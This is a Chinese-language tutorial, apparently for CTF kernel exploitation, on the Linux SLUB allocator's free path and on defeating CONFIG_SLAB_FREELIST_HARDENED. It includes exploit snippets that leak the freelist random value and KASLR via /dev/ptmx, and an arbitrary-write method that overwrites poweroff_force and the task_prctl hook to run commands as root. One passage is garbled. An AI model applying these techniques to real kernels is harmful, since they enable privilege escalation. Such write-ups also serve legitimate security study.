@@ -1,0 +1,205 @@
+    {
+        unsigned long freepointer_addr;
+        void *p;
+            //如果没开启CONFIG_DEBUG_PAGEALLOC, 那么就会进入get_freepointer()
+        if (!debug_pagealloc_enabled_static()) 
+            return get_freepointer(s, object);
+        freepointer_addr = (unsigned long)object + s->offset;
+        probe_kernel_read(&p, (void **)freepointer_addr, sizeof(p));
+        return freelist_ptr(s, p, freepointer_addr);
+    }
+## kfree过程
+同样只关注fastpath部分
+###  kfree()
+  * kfree()首先找到对象所属的页, 然后调用slab_free()处理
+    void kfree(const void *x)
+    {
+        struct page *page;
+        void *object = (void *)x;
+        trace_kfree(_RET_IP_, x);
+        if (unlikely(ZERO_OR_NULL_PTR(x))) //空指针直接返回
+            return;
+        page = virt_to_head_page(x); //找到x所属的页对象
+        ...;
+        slab_free(page->slab_cache, page, object, NULL, 1, _RET_IP_); //释放操作
+    }
+###  slab_free()
+    static __always_inline void slab_free(  struct kmem_cache *s,   //所属的slab缓存
+                                            struct page *page, //所属页
+                                            void *head, void *tail, int cnt, //从head到tail, 一个cnt个
+                                            unsigned long addr) //返回地址
+    {
+        if (slab_free_freelist_hook(s, &head, &tail))
+            do_slab_free(s, page, head, tail, cnt, addr);
+    }
+###  slab_free_freelist_hook()
+  * slab_free_freelist_hook()会遍历head到tail之间的对象, 构建一个freelist链表. 这些对象现在都是被分配出去的状态, 不需要锁.
+    static inline bool slab_free_freelist_hook(struct kmem_cache *s, void **head, void **tail)
+    {
+        void *object;
+        void *next = *head; //第一个要释放的
+        void *old_tail = *tail ? *tail : *head; 
+        int rsize;
+        /* 要重构的freelist的开头与结尾, head到tail中的对象被本线程拥有, 不涉及临界资源 */
+        *head = NULL;
+        *tail = NULL;
+        do {
+            object = next; //要释放的对象
+            next = get_freepointer(s, object); //从object中获取下一个空闲对象
+            if (slab_want_init_on_free(s)) { //如果想要在free时格式化对象
+                memset(object, 0, s->object_size);
+                rsize = (s->flags & SLAB_RED_ZONE) ? s->red_left_pad : 0;
+                memset((char *)object + s->inuse, 0, s->size - s->inuse - rsize);
+            }
+            if (!slab_free_hook(s, object)) { //通常返回false 
+                set_freepointer(s, object, *head); //在object写入指向*head的空闲指针. object->free_obj=*head
+                *head = object; //*head记录下一个被释放的对象
+                if (!*tail) //*tail记录第一个释放的对象
+                    *tail = object;
+            }
+        } while (object != old_tail);
+        if (*head == *tail)
+            *tail = NULL;
+        return *head != NULL;
+    }
+###  set_freepointer()
+  * set_freepointer()进行简单的double free检查后写入异或编码的指针
+    static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr, unsigned long ptr_addr)
+    {
+    #ifdef CONFIG_SLAB_FREELIST_HARDENED
+        /*
+            kasan_reset_tag(ptr_addr)会直接返回ptr_addr
+            如果配置中开启了CONFIG_SLAB_FREELIST_HARDENED
+            那么写入的空闲指针 = ptr XOR s->random XOR ptr所在地址
+        */
+        return (void *)((unsigned long)ptr ^ s->random ^ (unsigned long)kasan_reset_tag((void *)ptr_addr));
+    #else
+        return ptr; //如果没有保护, 那么原样返回
+    #endif
+    }
+    static inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)
+    {
+        unsigned long freeptr_addr = (unsigned long)object + s->offset; //object中写入空闲指针的位置
+    #ifdef CONFIG_SLAB_FREELIST_HARDENED
+        BUG_ON(object == fp); //double free: object的下一个空闲对象是自己
+    #endif
+        *(void **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr); //编码后写入
+    }
+###  do_slab_free()
+  * 释放空闲链表head-tail中的对象. 对于fastpath, 则直接把head-tail这段链表插入到kmen_cache_cpu->freelist中
+    static __always_inline void do_slab_free(struct kmem_cache *s, //所属slab缓存
+                                            struct page *page, //所属对象
+                                            void *head, void *tail, int cnt, //从head到tail中一共有cnt个对象要释放
+                                            unsigned long addr) //返回地址
+    {
+        void *tail_obj = tail ? : head;
+        struct kmem_cache_cpu *c;
+        unsigned long tid;
+    redo:
+        //与slab_alloc_node()类似 必须保证tid和kmem_cache都是通过同一个CPU获取的
+        do {
+            tid = this_cpu_read(s->cpu_slab->tid);
+            c = raw_cpu_ptr(s->cpu_slab);
+        } while (IS_ENABLED(CONFIG_PREEMPT) && unlikely(tid != READ_ONCE(c->tid)));
+        /* Same with comment on barrier() in slab_alloc_node() */
+        barrier();
+        if (likely(page == c->page)) { //fastpath: 如果page就是当前CPU缓存正在用于分配的页
+            set_freepointer(s, tail_obj, c->freelist); //头插法: tail->free_obj=原链表的头指针
+            /*
+                原子操作, 从头部把链表head-tail插入freelist: 
+                    if(s->cpu_slab->freelist==c->freelist) s->cpu_slab->freelist=head
+                    if(s->cpu_slab->tid==tid) s->cpu_slab->tid=next_tid(tid)
+                操作失败说明临界资源s->cpu_slab被别人抢占, 重试一次
+            */
+            if (unlikely(!this_cpu_cmpxchg_double(
+                    s->cpu_slab->freelist, s->cpu_slab->tid,
+                    c->freelist, tid,
+                    head, next_tid(tid)))) {
+                note_cmpxchg_failure("slab_free", s, tid);
+                goto redo;
+            }
+            stat(s, FREE_FASTPATH);
+        } else //否则进入slow path
+            __slab_free(s, page, head, tail_obj, cnt, addr);
+    }
+## Harden_freelist保护
+  * 在编译内核时有两个SLUB相关保护.
+  * 如果都关闭那么只要堆溢出劫持相邻对象的空闲指针即可, 过于简单就不说了. 先关注只开启Harden freelist的情况
+## 泄露随机数R
+  * `加固指针=空闲指针 ^ 空闲指针地址 ^ 随机数R`, 考虑从一个page内划分连续出多个对象的情况, 如下图.
+    freelist--->|object|---|
+                |......|   |
+                |......|   |
+             ---|object||object|---|
+                |......|   |
+                |......|   v
+  * 此时`空闲指针=空闲指针地址+对象大小`, 对于size较小的slab来说, 除了低12bit, 空闲指针与空闲指针的地址是完全相同的, 因此加固就退化为`加固后指针=一个常数^随机数R`,
+###  以0x8为例子
+  * 因此重点就在于如何预测页内偏移, 以连续申请16个size为8的对象为例, 
+    * 对于关于0x10对齐的对象A, 加上0x8并不会导致进位, 因此空闲指针=对象A的地址+0x8=对象A的地址|0x8
+    * 于是有`空闲指针^空闲指针的地址=0x8`
+    * 因此`加固指针=空闲指针 ^ 空闲指针地址 ^ 随机数R=随机数R^0x8`
+    * 因此 **读出0x10对齐的对象中的残留数据后, 异或0x8就可以泄露出随机数R**
+  * 那么怎么从多个残留数据中确定哪一个就是0x10对齐的对象?, 观察残留的数据可以发现, 所有关于0x10对齐的对象, 加固后的指针都是一样的, 因此每间隔一个就会出现一个相同的数据, 我们可以连续获取16个残留数据, 然后从这16个中找到循环出现8次的数据, 这个就是关于0x10对齐的对象中残留的加固后的指针了
+  * 如果无法获取多个残留数据并且无法直接确定释放关于0x10对齐, 那么就只能靠猜了, 成功率为`1/2`
+###  以0x100为例子
+  * 我们接下来看一下size为0x100的情况, 典型的情况如下. 我们排除掉最后一个比较特殊的残留数据, 先只看前15个, 原因后面会说
+  * 我们先不考虑进位的情况, 此时对象A的地址可以描述为: `0x....Y00, Y in {0, 1, 2, ...0xe}`, A的下一个对象的地址可以描述为`0x....(Y+1)00`, 两者异或结果为`0x Y^(Y+1) 00`
+  * 由于随机数的存在我们无法直接从残留数据的数值上倒推出页内偏移, 但是 **随机数异或只掩盖了数值, 并没有掩盖频率**.
+  * 形如`Y^(Y+1)`的异或结果如下, 我们可以发现结果为1的情况每隔一个出现一次. 对照上面残留数据, 发现确实有一组数据每隔一次出现一次
+  * 因此我们只要连续申请多个对象, 然后寻找每隔一次出现一次的数据, 这就对应`空闲指针^空闲指针地址=0x100`的情况, 只要将此数据异或0x100就可以泄露出随机数R
+  * 如果只能获取一个残留数据, 那么可以尝试直接与0x100异或, 成功率为`1/2`
+  * 对于0x200的size此规律仍然存在
+###  推广与证明
+  * 我们把上述规律进行推广: 在freelist中, 对于`size=1>(8*6)==0xFFFF)
+                break;
+        }
+        printf("heap_addr: %p\n", heap_addr);
+  * 那么申请哪个size比较好呢? kmalloc使用的slub如下 
+    * 在写入随机数R的时候, 我们的目标是尽量让空闲指针与空闲指针的地址抵消, 最好不要出现空闲指针为空的情况. 在slub缓存中size越小的缓存的对象越多, 因此最好申请size为8的
+    * 写入堆地址时, 我们的目标为空闲指针为空, slub缓存中size越大的缓存的越少, freelist链越短, 越可能申请到最后一个空闲对象, 因此最好社区sizze为8K的
+## 泄露内核地址
+  * 类似于ptmalloc泄露libc地址的思路, 我们需要让slub中某些对象沾上内核地址: 通过某些操作让内核申请一些带有内核地址的对象, 然后释放掉, 我们再把这个对象申请出来, 读出其中残留的数据来泄露内核地址
+  * 比较典型的就是`/dev/ptmx`这个设备, 申请`struct tty`时用的是`kmalloc-1k`这个slab, 因此打开`/dev/ptmx`后再关闭就可以在`kmalloc-1k`的freelist头部放入一个新鲜的`struct tty`, 我们把这个对象申请出来后可以通过`(struct tty)->ops`泄露内核地址, exp样例如下
+        //leak kernel address
+        int tty = open("/dev/ptmx", O_RDWR | O_NOCTTY); //alloc tty obj 
+        close(tty); //free tty obj
+        Add(0, 0x400); //alloc tty obj
+        uLL tty_obj[0x10];
+        Show(0, &tty_obj, 8*0x10);
+        uLL tty_ops_cur = tty_obj[3]; // tty_obj->ops
+        printf("tty_ops_cur %p\n", tty_ops_cur);
+        uLL tty_ops_nokaslr = 0xffffffff81e6b980;
+        LL kaslr = tty_ops_cur - tty_ops_nokaslr;
+        printf("kaslr %p\n", kaslr);
+  * 为了提供成功率我们可以打开多个`/dev/ptmx`然后再释放掉, 填满freelist
+## 劫持freelist实现任意写
+  * 至此所有需要的地址都已经凑齐, 任意写手法如下: 
+    * 申请两个对象A B, 先把B释放进入freelist中,
+    * 然后通过A去溢出B中的加固指针为`要写入的地址 ^ 对象B的地址 ^ 随机数R`
+    * 接着申请两次就可以在要写入的地方申请到对象
+  * 为了稳定性我选择B为freelist中最后一个对象, 因为对象中残留的指针就是`本对象地址^随机数R`, 我们可以直接得到对象B的地址, 而不需要偏移
+  * 实现任意写后我选择覆盖两个位置 
+    * `poweroff_force`: 这是一个字符串, 内核函数`poweroff_work_fun()`会以root权限执行其中的命令. 我们可以覆盖为要执行的特权指令
+    * `hp->hook.task_prctl`: 这是一个hook, 用户态执行`prctl(0)`内核就会调用这个hook. 我们可以覆盖为`poweroff_work_fun()`的地址
+    * 这样调用`prctl(0)`就可以以root权限执行`poweroff_force`中的命令, 十分方便
+  * 整体exp如下
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    typedef unsigned long long uLL;
+    typedef long long LL;
